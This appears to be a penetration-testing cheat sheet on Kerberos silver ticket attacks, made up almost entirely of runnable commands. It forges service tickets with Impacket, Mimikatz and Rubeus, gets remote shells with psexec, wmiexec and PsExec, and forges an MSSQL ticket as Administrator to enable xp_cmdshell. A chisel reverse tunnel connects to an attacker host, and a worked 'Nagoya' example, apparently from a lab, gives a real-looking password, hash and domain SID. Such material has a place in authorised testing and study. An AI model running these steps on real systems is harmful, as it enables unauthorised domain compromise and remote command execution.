# Silver Ticket

## Silver ticket

With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:

```shell
# To generate the TGS with NTLM
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# To generate the TGS with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

With [Mimikatz](https://github.com/gentilkiwi/mimikatz):

```shell
# To generate the TGS with NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# Inject TGS with Mimikatz
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):

```shell
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):

```shell
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

## MSSQL Service Silver Ticket

If you recover a service account password/hash for an MSSQL SPN but the SQL login does not have enough privilege for actions such as enabling `xp_cmdshell`, forge a ticket for that exact SPN as `Administrator` or another high-privilege user. This can turn a low-privileged MSSQL login into an administrative MSSQL session if the service ticket is accepted.

Convert the service account password to NTLM, then create the ticket:

```bash
impacket-ticketer -nthash NTLM_HASH \
  -domain-sid DOMAIN_SID \
  -domain DOMAIN \
  -spn mssql/SQL_HOST_FQDN \
  Administrator
```

Nagoya example, using service password `changeme123`:

```text
changeme123 -> 2AD421D6036D46E5CA5AA1F14922EAF4
```

```bash
impacket-ticketer -nthash 2AD421D6036D46E5CA5AA1F14922EAF4 \
  -domain-sid S-1-5-21-1969309164-1513403977-1686805993 \
  -domain nagoya-industries.com \
  -spn mssql/nagoya.nagoya-industries.com \
  Administrator
```

Create a minimal Kerberos config that avoids hostname canonicalization changing the SPN target:

```bash
cat > /tmp/krb5-no-canon.conf <<'EOF'
[libdefaults]
    default_realm = DOMAIN_UPPER
    dns_canonicalize_hostname = false
    rdns = false

[domain_realm]
    .domain.local = DOMAIN_UPPER
    domain.local = DOMAIN_UPPER
EOF
```

Nagoya example:

```bash
cat > /tmp/krb5-no-canon.conf <<'EOF'
[libdefaults]
    default_realm = NAGOYA-INDUSTRIES.COM
    dns_canonicalize_hostname = false
    rdns = false

[domain_realm]
    .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
    nagoya-industries.com = NAGOYA-INDUSTRIES.COM
EOF
```

Use the generated ccache. The hostname after `@` in `mssqlclient` must match the forged SPN host:

```bash
export KRB5_CONFIG=/tmp/krb5-no-canon.conf
export KRB5CCNAME=Administrator.ccache

impacket-mssqlclient DOMAIN/Administrator@SQL_HOST_FQDN -target-ip 127.0.0.1 -windows-auth -k -no-pass
```
With a forged MSSQL silver ticket, use Kerberos auth and make the hostname match the SPN used in the ticket:
Nagoya example:

```bash
export KRB5_CONFIG=/tmp/krb5-no-canon.conf
export KRB5CCNAME=Administrator.ccache

impacket-mssqlclient nagoya-industries.com/Administrator@nagoya.nagoya-industries.com -target-ip 127.0.0.1 -windows-auth -k -no-pass
```

After connecting as an administrative SQL user, enable and use `xp_cmdshell`:

```sql
enable_xp_cmdshell
xp_cmdshell whoami
```

If MSSQL is only reachable locally on the target, reverse-forward it first, for example:

```bash
./chisel server --port 8080 --reverse
.\chisel.exe client ATTACKER_IP:8080 R:1433:127.0.0.1:1433
```

Nagoya example:

```bash
./chisel server --port 8080 --reverse
.\chisel.exe client 192.168.45.240:8080 R:1433:127.0.0.1:1433
```
